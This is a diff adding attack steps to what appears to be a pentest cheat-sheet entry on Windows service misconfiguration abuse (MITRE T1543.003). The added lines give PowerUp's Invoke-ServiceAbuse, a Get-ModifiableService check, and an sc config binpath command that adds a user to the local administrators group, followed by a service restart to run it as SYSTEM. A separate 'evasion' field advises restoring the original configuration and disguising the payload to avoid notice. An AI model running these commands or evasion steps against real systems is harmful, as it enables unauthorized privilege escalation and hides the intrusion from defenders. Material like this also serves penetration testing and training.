@@ -89,6 +89,27 @@
     "sources": [
       "HTB M26",
       "MITRE T1543.003"
-    ]
-  }
+    ],
+    "evasion": "Restore the original service binary/ACL/registry value after execution; trigger via a scheduled restart instead of an obvious sc stop/start; name the payload to blend with the legitimate service."
+  },
+  "variations": [
+    {
+      "label": "PowerUp",
+      "command": "Invoke-ServiceAbuse -Name '<service>' -UserName '<domain>\\<user>'"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Find services whose config you can change",
+      "command": "Get-ModifiableService -Verbose"
+    },
+    {
+      "label": "Point binPath at your command",
+      "command": "sc config <service> binpath= \"net localgroup administrators <user> /add\""
+    },
+    {
+      "label": "Restart to execute as SYSTEM",
+      "command": "sc stop <service> & sc start <service>"
+    }
+  ]
 }
